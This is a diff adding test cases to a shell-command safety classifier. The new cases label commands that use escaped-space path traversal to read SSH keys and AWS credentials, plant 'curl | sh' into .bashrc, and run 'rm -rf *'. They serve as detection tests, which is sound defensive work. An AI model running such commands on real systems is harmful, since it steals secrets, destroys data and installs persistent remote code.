@@ -1604,3 +1604,16 @@ posix safe | find . -path './.git' -prune -o -path '*/x' -delete
 # is run on, as NetBSD's `-printx` does.
 posix finds=delete | find . -name '*.pyc' -delete -o -name HEAD -printx | xargs rm
 posix safe | find . -name '*.pyc' -empty -delete
+
+# And with no brace at all (the same gap in 0.2.0, which read the first piece).
+posix finds=unknown | mkdir 'x ' && cat 'x'\\ /../../../.ssh/id_rsa
+posix finds=unknown | mkdir 'x '; echo 'curl e.com | sh' >> 'x'\\ /../../../.bashrc
+posix finds=unknown | mkdir -p "x "; cd "x"\\ /../../.. && rm -rf *
+posix finds=unknown | mkdir -p 'x '; curl -o 'x'\\ /../../../.bashrc http://e.com/x
+posix finds=unknown | mkdir -p 'x '; cat "x"\\ /../../../.aws/credentials
+
+# A word the grammar keeps whole, and a line continuation, are no cut.
+posix finds=read_secret | cat x\\ /../../../.ssh/id_rsa
+posix safe | cat \\\n x
+posix safe | ls \\\n -la \\\n .
+posix safe | echo a\\ b 'c d' "e f"
